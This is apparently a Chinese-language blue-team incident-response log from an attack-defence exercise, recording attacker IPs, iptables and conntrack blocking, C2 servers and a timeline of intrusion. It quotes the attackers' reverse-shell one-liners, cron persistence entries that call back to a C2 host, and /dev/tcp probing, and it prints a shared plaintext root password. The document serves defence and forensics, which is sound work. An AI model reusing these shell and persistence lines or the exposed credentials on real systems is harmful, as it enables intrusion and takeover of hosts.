...
### 攻击来源
**IP: 183.223.221.112** — 对目标机发起多漏洞利用
...
### 操作
```bash
iptables -I FORWARD 1 -s 183.223.221.112 -j DROP
```
...
| 机器 | EDR | BPF | 关键服务 | 备注 |
|------|:---:|:---:|------|------|
| 网关 188 | ✅ active | — | IPS ✅ | 已封禁 183.223.221.112 |
...
### 攻击持续
封禁后攻击 IP `183.223.221.112` 仍有 15 条告警（11:24~11:26），因已建立的 TCP 连接在 iptables 规则添加前已存在。

### 加固操作
1. `iptables -I INPUT 1 -s 183.223.221.112 -j DROP` — INPUT 链首行封禁
2. `iptables -I FORWARD 1 -s 183.223.221.112 -j DROP` — FORWARD 链双保险
3. `conntrack -D -s 183.223.221.112` — 清理已建立连接
...
| 机器 | EDR | BPF | 关键服务 | 备注 |
|------|:---:|:---:|------|------|
| 网关 188 | ✅ active | — | IPS ✅ | 183.223.221.112 已封禁 705包 |
| 目标机 186 | ✅ active | 19探针 | WAF + ShopPulse | SSH 间歇不可达(sshd僵死) |
| 审计 187 | ✅ active | — | Supervisor ✅ | 正常 |
...
| 时间 | 主机 | 操作 | 检测 |
|------|------|------|------|
| 01:26 | 网关 | `nc 172.16.1.186 22` | process-access-blacklist (recorded) |
...
| 时间 | 操作 | 详情 |
|------|------|------|
| 03:22 | 端口探测 | `echo >/dev/tcp/172.16.1.186/22,443,8080,8090` |
| 03:46:09 | 反弹Shell | `curl → 8.137.205.66:8080 ... bash -i >& /dev/tcp/8.137.201.209/5555` |
| 03:46:47 | 反弹Shell v2 | `exec 5<>/dev/tcp/8.137.201.209/5555` |
| 03:47:08 | 反弹Shell v3 | `/bin/bash -i >& /dev/tcp/8.137.201.209/5555` |
| 05:20:51 | 持续控制 | `sessionId:"rev1" ... eval $line` ← 攻击者仍在活跃 |

### 发现C2服务器

**8.137.205.66:8080** — 攻击者的命令控制服务器。网关被用作跳板通过 curl 与C2通信。已封禁 OUTPUT+FORWARD+INPUT 链。
...
| IP | 原因 | 封禁链 |
|----|------|------|
| 183.223.221.112 | RCE主攻（root权限47分钟） | FORWARD+INPUT |
| 39.144.138.244 | diagnostic命令注入探测 | FORWARD+INPUT |
| **8.137.205.66** | **C2服务器** | OUTPUT+FORWARD+INPUT |
...
| `crontab_entry` | 11:20 | `*/1 * * * * root /bin/bash -c "bash -i >& /dev/tcp/8.137.201.209/4444 0>&1"` — 每分钟反弹Shell到网关 |
| `cron2` | 11:22 | `*/1 * * * * root curl -s http://8.137.201.209:80/callback_$(hostname)_$(date +%s)` — C2回调 |
...
5. 使用蓝队网关 (8.137.201.209) 作为 C2 回连地址
...
巡检脚本执行中发现新攻击者 IP `171.218.229.14` 正在攻击 diagnostic 命令注入。封禁后在网关 `/tmp/` 发现大规模攻击痕迹。
...
目标机 (186)  diagnostic RCE → root
       │
       ├── nc 172.16.1.188 5555  (反弹Shell到网关)
       │
...
`171.218.229.14` — diagnostic 命令注入攻击，FORWARD+INPUT DROP
...
| IP | 原因 |
|----|------|
| 183.223.221.112 | RCE主攻, root权限47分钟 |
| 39.144.138.244 | diagnostic命令注入探测 |
| 8.137.205.66 | C2服务器 |
| 171.218.229.14 | diagnostic命令注入(最新) |
...
| 时间 | 机器 | 密码 |
|------|------|------|
| 初版 | 全部 | WnfU3ieboz62oLrj |
| 06-22 | 网关 | WnfU3ieboz62oLrj1 |
| 06-22 | 网关 | WnfU3ieboz62oLrj2 |
...
10 个 IP (183.223.221.112, 39.144.138.244, 8.137.205.66, 171.218.229.14, 121.40.26.2, 47.110.88.158, 121.199.1.3, 121.40.21.118 等)
...
**溯源**: 通过站长之家反查域名，获取公网 IP: **8.137.220.109**

**处置**: 
- 网关三链封禁 `8.137.220.109`（INPUT + FORWARD + OUTPUT + conntrack 清连接）
...
- C2: `doh.rjay9.top` → `8.137.220.109`
...
修改网络拓扑，限制目标机 (172.16.1.186) 与审计中心 (172.16.1.187) 的外网直连能力：
...
| IP | 原因 | 封禁时间 |
|----|------|------|
| 183.223.221.112 | RCE主攻, root权限47分钟 | 06-22 11:22 |
| 39.144.138.244 | diagnostic命令注入探测 | 06-22 11:50 |
| 8.137.205.66 | C2服务器 | 06-22 14:00 |
| 171.218.229.14 | diagnostic命令注入 | 06-22 16:37 |
| 121.40.26.2 | 夜间扫描 | 06-23 09:00 |
| 47.110.88.158 | 夜间扫描 | 06-23 09:00 |
| 121.199.1.3 | 夜间扫描 | 06-23 09:00 |
| 121.40.21.118 | 夜间扫描 | 06-23 09:00 |
| 212.73.148.11 | SSH-2.0-Go探测 | 06-23 |
| 20.80.83.86 | Zmap扫描 | 06-23 |
| **8.137.220.109** | **ddbf_c2 C2 (doh.rjay9.top)** | 06-23 15:00 |
...
**操作员**: 蓝队  
**目标**: 网关 (172.16.1.188) + Web业务机 (172.16.1.186) + 审计中心 (172.16.1.187)  
...
- `183.223.221.112` 于 10:32 完成 RCE，`id` 返回 `root`
...
- `172.16.1.186 → 172.16.1.188` Jun 22 13:18:48，会话仅 **0.14秒**（自动化 scp/ssh 单命令）
...
- `BLUE-TEAM-HANDOVER.md` 揭露三机初始统一弱口令 `WnfU3ieboz62oLrj`
...
| 时间 | 事件 | 来源 |
|------|------|------|
| Jun 22 09:08 | 183.223.221.112 SSH 登录网关（蓝队操作） | 网关 auth.log |
...
- **Red Team IP**: 183.223.221.112 (主攻), 47.109.140.59, 47.109.92.89 (C2), 171.218.229.14, 47.120.32.148
